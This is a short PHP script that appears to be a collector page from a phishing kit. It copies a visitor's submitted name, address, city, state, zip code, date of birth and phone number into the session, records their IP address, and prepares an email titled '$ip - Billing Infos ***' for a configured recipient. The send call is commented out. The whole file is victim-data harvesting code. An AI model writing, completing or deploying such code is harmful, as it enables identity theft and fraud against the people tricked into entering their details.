<?php
session_start();
require_once("../../inc/config.inc.php");
require_once("../../inc/function.inc.php");

$_SESSION['FName'] = $_POST['first_name'];
$_SESSION['LName'] = $_POST['last_name'];
$_SESSION['Add'] = $_POST['address'];
$_SESSION['Ct'] = $_POST['city'];
$_SESSION['St'] = $_POST['state'];
$_SESSION['Zp'] = $_POST['zip'];
$_SESSION['Dob'] = $_POST['dob'];
$_SESSION['ph'] = $_POST['phone'];
$ip=getip();
$subject="$ip - Billing Infos  ***";
$to = $setting["mail_to"];

//send($_SESSION,$to,$subject); 

?>
